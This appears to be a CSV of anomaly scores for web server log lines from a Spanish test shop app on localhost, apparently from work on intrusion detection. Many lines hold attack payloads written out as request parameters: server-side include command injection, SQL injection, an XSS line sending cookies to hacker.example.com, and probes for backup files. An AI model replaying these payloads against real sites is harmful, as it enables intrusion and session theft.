score_content,score_session,score_fused,line
3.121804714202881,8.139467239379883,5.630635976791382,localhost:8080 - - [10/Jan/2025:14:41:39 +0000] "POST http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1 HTTP/1.1" 200 177 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
79.42351531982422,488.4712219238281,283.9473686218262,localhost:8080 - - [10/Jan/2025:14:41:40 +0000] "GET http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=charlesb&password=m96fan19&nombre=Durante&apellidos=Campusano+Caldero&email=gheorghiu-battaglia%40sanchezgordo.bt&dni=44335499D&direccion=C%2F+Padre+Luis+Maria+Arteche+0+5B&ciudad=%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%22--%3E%3C&cp=37716&provincia=Cantabria&ntc=6556979183874771&B1=Registrar HTTP/1.1 HTTP/1.1" 200 1107 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.121804714202881,8.139467239379883,5.630635976791382,localhost:8080 - - [10/Jan/2025:14:41:40 +0000] "POST http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1 HTTP/1.1" 200 177 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
67.23767852783203,413.5186767578125,240.37817764282227,localhost:8080 - - [10/Jan/2025:14:41:40 +0000] "GET http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&loginA=charlesb&password=m96fan19&nombre=Durante&apellidos=Campusano+Caldero&email=gheorghiu-battaglia%40sanchezgordo.bt&dni=44335499D&direccion=C%2F+Padre+Luis+Maria+Arteche+0+5B&ciudad=Palma+de+Mallorca&cp=37716&provincia=Cantabria&ntc=6556979183874771&B1=Registrar HTTP/1.1 HTTP/1.1" 200 1023 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.121804714202881,8.139467239379883,5.630635976791382,localhost:8080 - - [10/Jan/2025:14:41:40 +0000] "POST http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1 HTTP/1.1" 200 177 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
5.4529242515563965,14.808660507202148,10.130792379379272,localhost:8080 - - [10/Jan/2025:14:41:41 +0000] "GET http://localhost:8080/tienda1/publico/vaciar.jsp?B2A=Vaciar+carrito HTTP/1.1 HTTP/1.1" 200 228 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.0720291137695312,7.564772605895996,5.318400859832764,localhost:8080 - - [10/Jan/2025:14:41:41 +0000] "POST http://localhost:8080/tienda1/publico/vaciar.jsp HTTP/1.1 HTTP/1.1" 200 171 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
0.4617548882961273,8.654851913452148,4.558303400874138,localhost:8080 - - [10/Jan/2025:14:41:41 +0000] "GET http://localhost:8080/tienda1/publico/vaciar.jsp.BAK HTTP/1.1 HTTP/1.1" 200 183 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
0.4062533378601074,8.046475410461426,4.226364374160767,localhost:8080 - - [10/Jan/2025:14:41:41 +0000] "GET http://localhost:8080/tienda1/global/menum.jsp.Old HTTP/1.1 HTTP/1.1" 200 177 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
1.3825421333312988,4.545295238494873,2.963918685913086,localhost:8080 - - [10/Jan/2025:14:41:42 +0000] "GET http://localhost:8080/asf-logo-wide HTTP/1.1 HTTP/1.1" 200 132 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
1.0069619417190552,13.849085807800293,7.428023874759674,localhost:8080 - - [10/Jan/2025:14:41:42 +0000] "GET http://localhost:8080/tienda1/miembros/imagenes/asf-logo-wide.java HTTP/1.1 HTTP/1.1" 200 225 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
0.2015005648136139,5.308950901031494,2.755225732922554,localhost:8080 - - [10/Jan/2025:14:41:42 +0000] "GET http://localhost:8080/asf-logo-wide.BAK HTTP/1.1 HTTP/1.1" 200 144 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
0.3120861351490021,6.9311933517456055,3.6216397434473038,localhost:8080 - - [10/Jan/2025:14:41:42 +0000] "GET http://localhost:8080/scripts/tools/mkilog.exe HTTP/1.1 HTTP/1.1" 200 165 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
63.95449447631836,393.2541198730469,228.60430717468262,localhost:8080 - - [10/Jan/2025:14:41:43 +0000] "GET http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=han-fei&password=esPUeNdA&nombre=%3FBa.s-iana&apellidos=Barril+Scifo&email=noel-noel.abel-gance%40videocasa-ebs.yu&dni=88159654X&direccion=Calle+Luis+i+165+10A&ciudad=Castrillo+de+la+Guare%F1a&cp=43830&provincia=Albacete&ntc=6015225993356578&B1=Registrar HTTP/1.1 HTTP/1.1" 200 999 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.0962166786193848,7.847889423370361,5.472053050994873,localhost:8080 - - [10/Jan/2025:14:41:43 +0000] "POST http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1 HTTP/1.1" 200 174 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
62.345985412597656,383.3135681152344,222.82977676391602,localhost:8080 - - [10/Jan/2025:14:41:43 +0000] "GET http://localhost:8080/tienda1/miembros/editar.jsp?modoA=registro&login=han-fei&password=esPUeNdA&nombre=Sartino&apellidos=Barril+Scifo&email=noel-noel.abel-gance%40videocasa-ebs.yu&dni=88159654X&direccion=Calle+Luis+i+165+10A&ciudad=Castrillo+de+la+Guare%F1a&cp=43830&provincia=Albacete&ntc=6015225993356578&B1=Registrar HTTP/1.1 HTTP/1.1" 200 987 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.0962166786193848,7.847889423370361,5.472053050994873,localhost:8080 - - [10/Jan/2025:14:41:43 +0000] "POST http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1 HTTP/1.1" 200 174 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
0.43330496549606323,8.346451759338379,4.389878362417221,localhost:8080 - - [10/Jan/2025:14:41:44 +0000] "GET http://localhost:8080/iisadmin/htmldocs/iisdocs.htm HTTP/1.1 HTTP/1.1" 200 180 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
0.21305690705776215,5.514747142791748,2.863902024924755,localhost:8080 - - [10/Jan/2025:14:41:44 +0000] "GET http://localhost:8080/tienda1/index.jsp~ HTTP/1.1 HTTP/1.1" 200 147 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
10.951032638549805,55.70706558227539,33.3290491104126,localhost:8080 - - [10/Jan/2025:14:41:44 +0000] "GET http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=Jam%F3n+Ib%E9rico&precio=100%2F&cantidad=38&B1=A%F1adir+al+carrito HTTP/1.1 HTTP/1.1" 200 408 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.0720291137695312,7.564772605895996,5.318400859832764,localhost:8080 - - [10/Jan/2025:14:41:44 +0000] "POST http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1 HTTP/1.1" 200 171 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
10.557831764221191,52.97054672241211,31.76418924331665,localhost:8080 - - [10/Jan/2025:14:41:45 +0000] "GET http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=Jam%F3n+Ib%E9rico&precio=39&cantidadA=38&B1=A%F1adir+al+carrito HTTP/1.1 HTTP/1.1" 200 399 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.0720291137695312,7.564772605895996,5.318400859832764,localhost:8080 - - [10/Jan/2025:14:41:45 +0000] "POST http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1 HTTP/1.1" 200 171 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
9.57010269165039,46.02766418457031,27.79888343811035,localhost:8080 - - [10/Jan/2025:14:41:45 +0000] "GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=kenkel&pwd=ad5er4r%2500&remember=on&B1=Entrar HTTP/1.1 HTTP/1.1" 200 375 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.17718505859375,8.747926712036133,5.962555885314941,localhost:8080 - - [10/Jan/2025:14:41:45 +0000] "POST http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1 HTTP/1.1" 200 183 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
8.778411865234375,40.37604904174805,24.57723045349121,localhost:8080 - - [10/Jan/2025:14:41:46 +0000] "GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=kenkel&pwd=%2520&remember=on&B1=Entrar HTTP/1.1 HTTP/1.1" 200 354 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.17718505859375,8.747926712036133,5.962555885314941,localhost:8080 - - [10/Jan/2025:14:41:46 +0000] "POST http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1 HTTP/1.1" 200 183 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
9.336993217468262,44.37255859375,26.85477590560913,localhost:8080 - - [10/Jan/2025:14:41:46 +0000] "GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=kenkel&pwd=ad5er4r&remember=on%2F&B1=Entrar HTTP/1.1 HTTP/1.1" 200 369 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.17718505859375,8.747926712036133,5.962555885314941,localhost:8080 - - [10/Jan/2025:14:41:46 +0000] "POST http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1 HTTP/1.1" 200 183 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
9.10941219329834,42.7497444152832,25.92957830429077,localhost:8080 - - [10/Jan/2025:14:41:47 +0000] "GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=kenkel&pwd=ad5er4r&rememberA=on&B1=Entrar HTTP/1.1 HTTP/1.1" 200 363 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.17718505859375,8.747926712036133,5.962555885314941,localhost:8080 - - [10/Jan/2025:14:41:47 +0000] "POST http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1 HTTP/1.1" 200 183 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
11.716858863830566,10.691102027893066,11.203980445861816,localhost:9090 - - [10/Jan/2025:14:41:47 +0000] "PUT http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1 HTTP/1.1" 200 198 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
5.2638726234436035,13.12624740600586,9.195060014724731,localhost:8080 - - [10/Jan/2025:14:41:47 +0000] "GET http://localhost:8080/tienda1/publico/caracteristicas.jsp?idA=1 HTTP/1.1 HTTP/1.1" 200 216 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.3401055335998535,10.415877342224121,6.877991437911987,localhost:8080 - - [10/Jan/2025:14:41:48 +0000] "POST http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1 HTTP/1.1" 200 198 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
0.7808305621147156,11.807015419006348,6.293922990560532,localhost:8080 - - [10/Jan/2025:14:41:48 +0000] "GET http://localhost:8080/tienda1/publico/caracteristicas.jsp.INC HTTP/1.1 HTTP/1.1" 200 210 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
0.22602993249893188,5.729245662689209,2.9776377975940704,localhost:8080 - - [10/Jan/2025:14:41:48 +0000] "GET http://localhost:8080/iisadmpwd/aexp4.htr HTTP/1.1 HTTP/1.1" 200 150 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
8.254410743713379,36.58146667480469,22.417938709259033,localhost:8080 - - [10/Jan/2025:14:41:48 +0000] "GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas%27+AND+%271%27%3D%271 HTTP/1.1 HTTP/1.1" 200 339 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.0720291137695312,7.564772605895996,5.318400859832764,localhost:8080 - - [10/Jan/2025:14:41:49 +0000] "POST http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1 HTTP/1.1" 200 171 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
6.4315505027771,22.85451889038086,14.64303469657898,localhost:8080 - - [10/Jan/2025:14:41:49 +0000] "GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsgA=Credenciales+incorrectas HTTP/1.1 HTTP/1.1" 200 276 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.0720291137695312,7.564772605895996,5.318400859832764,localhost:8080 - - [10/Jan/2025:14:41:49 +0000] "POST http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1 HTTP/1.1" 200 171 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
0.4617548882961273,8.654851913452148,4.558303400874138,localhost:8080 - - [10/Jan/2025:14:41:49 +0000] "GET http://localhost:8080/tienda1/publico/entrar.jsp.Inc HTTP/1.1 HTTP/1.1" 200 183 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
7.053979873657227,27.662118911743164,17.358049392700195,localhost:8080 - - [10/Jan/2025:14:41:50 +0000] "GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=9168%257C&B1=Confirmar HTTP/1.1 HTTP/1.1" 200 300 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.049243927001953,7.290140628814697,5.169692277908325,localhost:8080 - - [10/Jan/2025:14:41:50 +0000] "POST http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1 HTTP/1.1" 200 168 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
36.86548614501953,224.36167907714844,130.61358261108398,localhost:8080 - - [10/Jan/2025:14:41:50 +0000] "GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=9168&B1=sessionid%3D12312312%26+username%3D%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E HTTP/1.1 HTTP/1.1" 200 768 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.049243927001953,7.290140628814697,5.169692277908325,localhost:8080 - - [10/Jan/2025:14:41:50 +0000] "POST http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1 HTTP/1.1" 200 168 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
6.890066623687744,26.411399841308594,16.65073323249817,localhost:8080 - - [10/Jan/2025:14:41:51 +0000] "GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=9168&B1=Confirmar%2F HTTP/1.1 HTTP/1.1" 200 294 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.049243927001953,7.290140628814697,5.169692277908325,localhost:8080 - - [10/Jan/2025:14:41:51 +0000] "POST http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1 HTTP/1.1" 200 168 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
6.731695175170898,25.193195343017578,15.962445259094238,localhost:8080 - - [10/Jan/2025:14:41:51 +0000] "GET http://localhost:8080/tienda1/publico/pagar.jsp?modoA=insertar&precio=9168&B1=Confirmar HTTP/1.1 HTTP/1.1" 200 288 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.049243927001953,7.290140628814697,5.169692277908325,localhost:8080 - - [10/Jan/2025:14:41:51 +0000] "POST http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1 HTTP/1.1" 200 168 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
48.16535949707031,295.256103515625,171.71073150634766,localhost:8080 - - [10/Jan/2025:14:41:52 +0000] "GET http://localhost:8080/tienda1/publico/registro.jsp?modo=%7C&login=denna&password=89S0R56Gl8&nombre=Reynard&apellidos=H%E9rard&email=bardy%40busquedadeempleo.mw&dni=18720571C&direccion=Ordo%F1ez+31%2C+4%3FG&ciudad=Vinuesa&cp=50584&provincia=Zaragoza&ntc=0820484159407817&B1=Registrar HTTP/1.1 HTTP/1.1" 200 873 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.121804714202881,8.139467239379883,5.630635976791382,localhost:8080 - - [10/Jan/2025:14:41:52 +0000] "POST http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1 HTTP/1.1" 200 177 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
52.7926025390625,324.0823974609375,188.4375,localhost:8080 - - [10/Jan/2025:14:41:52 +0000] "GET http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=denna&password=89S0R56Gl8&nombre=Deni%3F%27%3Fce&apellidos=H%E9rard&email=bardy%40busquedadeempleo.mw&dni=18720571C&direccion=Ordo%F1ez+31%2C+4%3FG&ciudad=Vinuesa&cp=50584&provincia=Zaragoza&ntc=0820484159407817&B1=Registrar HTTP/1.1 HTTP/1.1" 200 912 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.121804714202881,8.139467239379883,5.630635976791382,localhost:8080 - - [10/Jan/2025:14:41:52 +0000] "POST http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1 HTTP/1.1" 200 177 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
50.27206039428711,308.3926696777344,179.33236503601074,localhost:8080 - - [10/Jan/2025:14:41:53 +0000] "GET http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&loginA=denna&password=89S0R56Gl8&nombre=Reynard&apellidos=H%E9rard&email=bardy%40busquedadeempleo.mw&dni=18720571C&direccion=Ordo%F1ez+31%2C+4%3FG&ciudad=Vinuesa&cp=50584&provincia=Zaragoza&ntc=0820484159407817&B1=Registrar HTTP/1.1 HTTP/1.1" 200 891 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.121804714202881,8.139467239379883,5.630635976791382,localhost:8080 - - [10/Jan/2025:14:41:53 +0000] "POST http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1 HTTP/1.1" 200 177 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
5.897814750671387,18.569156646728516,12.233485698699951,localhost:8080 - - [10/Jan/2025:14:41:53 +0000] "GET http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carritoAND+1%3D1 HTTP/1.1 HTTP/1.1" 200 252 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.0720291137695312,7.564772605895996,5.318400859832764,localhost:8080 - - [10/Jan/2025:14:41:53 +0000] "POST http://localhost:8080/tienda1/publico/vaciar.jsp HTTP/1.1 HTTP/1.1" 200 171 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
5.4529242515563965,14.808660507202148,10.130792379379272,localhost:8080 - - [10/Jan/2025:14:41:54 +0000] "GET http://localhost:8080/tienda1/publico/vaciar.jsp?B2A=Vaciar+carrito HTTP/1.1 HTTP/1.1" 200 228 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.0720291137695312,7.564772605895996,5.318400859832764,localhost:8080 - - [10/Jan/2025:14:41:54 +0000] "POST http://localhost:8080/tienda1/publico/vaciar.jsp HTTP/1.1 HTTP/1.1" 200 171 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
0.3806047737598419,7.754942417144775,4.067773595452309,localhost:8080 - - [10/Jan/2025:14:41:54 +0000] "GET http://localhost:8080/tienda1/publico/vaciar.jsp/ HTTP/1.1 HTTP/1.1" 200 174 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
0.6250280141830444,10.322636604309082,5.473832309246063,localhost:8080 - - [10/Jan/2025:14:41:54 +0000] "GET http://localhost:8080/tienda1/6909030637832563290.jsp.inc HTTP/1.1 HTTP/1.1" 200 198 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
1.6265002489089966,19.06670570373535,10.346602976322174,localhost:8080 - - [10/Jan/2025:14:41:55 +0000] "GET http://localhost:8080/WebSphereSamples/SingleSamples/Increment/increment.html HTTP/1.1 HTTP/1.1" 200 258 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
0.3563600480556488,7.471868515014648,3.9141142815351486,localhost:8080 - - [10/Jan/2025:14:41:55 +0000] "GET http://localhost:8080/samples/dbsamp/dbsamp2.htm HTTP/1.1 HTTP/1.1" 200 171 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
56.889930725097656,349.5287780761719,203.20935440063477,localhost:8080 - - [10/Jan/2025:14:41:55 +0000] "GET http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=mau%2Brino&password=Desaprovedhosa&nombre=Guy&apellidos=Peruyero+Danis&email=sundbery-vonic%40castigado.tf&dni=61857027E&direccion=C%2F+Jose+Maria+Pereda%2C+49+&ciudad=Chodes&cp=12319&provincia=Albacete&ntc=8340633556666736&B1=Registrar HTTP/1.1 HTTP/1.1" 200 945 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.0962166786193848,7.847889423370361,5.472053050994873,localhost:8080 - - [10/Jan/2025:14:41:55 +0000] "POST http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1 HTTP/1.1" 200 174 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
55.0068244934082,337.8423156738281,196.42457008361816,localhost:8080 - - [10/Jan/2025:14:41:56 +0000] "GET http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=eiko&password=Desaprovedhosa&nombre=Guy&apellidos=Peruyero+Danis&email=sundbery-vonic%40castigado.tf&dni=61857027E&direccion=C%2F+Jose+Maria+Pereda%2C+49+&ciudad=Chodes&cpA=12319&provincia=Albacete&ntc=8340633556666736&B1=Registrar HTTP/1.1 HTTP/1.1" 200 930 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.0962166786193848,7.847889423370361,5.472053050994873,localhost:8080 - - [10/Jan/2025:14:41:56 +0000] "POST http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1 HTTP/1.1" 200 174 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
0.2015005648136139,5.308950901031494,2.755225732922554,localhost:8080 - - [10/Jan/2025:14:41:56 +0000] "GET http://localhost:8080/asf-logo-wide.Old HTTP/1.1 HTTP/1.1" 200 144 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
1.593509554862976,7.726365566253662,4.659937560558319,localhost:8080 - - [10/Jan/2025:14:41:56 +0000] "GET http://localhost:8080/tienda1/4861362529278789730 HTTP/1.1 HTTP/1.1" 200 174 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
1.1070972681045532,14.723746299743652,7.915421783924103,localhost:8080 - - [10/Jan/2025:14:41:57 +0000] "GET http://localhost:8080/tienda1/imagenes/3.gif/4861362529278789730.OLD HTTP/1.1 HTTP/1.1" 200 231 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
0.9123541116714478,13.007440567016602,6.959897339344025,localhost:8080 - - [10/Jan/2025:14:41:57 +0000] "GET http://localhost:8080/tienda1/imagenes/cmenbul.gif/asf-logo-wide HTTP/1.1 HTTP/1.1" 200 219 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
26.264162063598633,156.90284729003906,91.58350467681885,localhost:8080 - - [10/Jan/2025:14:41:57 +0000] "GET http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=Jam%F3n+Ib%E9rico&precio=85paros%2522%2520style%3D%2522background%3Aurl%28javascript%3Aalert%28%27Paros%27%29%29&cantidad=34&B1=A%F1adir+al+carrito HTTP/1.1 HTTP/1.1" 200 651 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.0720291137695312,7.564772605895996,5.318400859832764,localhost:8080 - - [10/Jan/2025:14:41:57 +0000] "POST http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1 HTTP/1.1" 200 171 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
17.760847091674805,101.61326599121094,59.68705654144287,localhost:8080 - - [10/Jan/2025:14:41:58 +0000] "GET http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=Jam%F3n+Ib%E9rico&precio=Set-cookie%253A%2BTamper%253D1041264011025374727&cantidad=34&B1=A%F1adir+al+carrito HTTP/1.1 HTTP/1.1" 200 534 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.0720291137695312,7.564772605895996,5.318400859832764,localhost:8080 - - [10/Jan/2025:14:41:58 +0000] "POST http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1 HTTP/1.1" 200 171 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
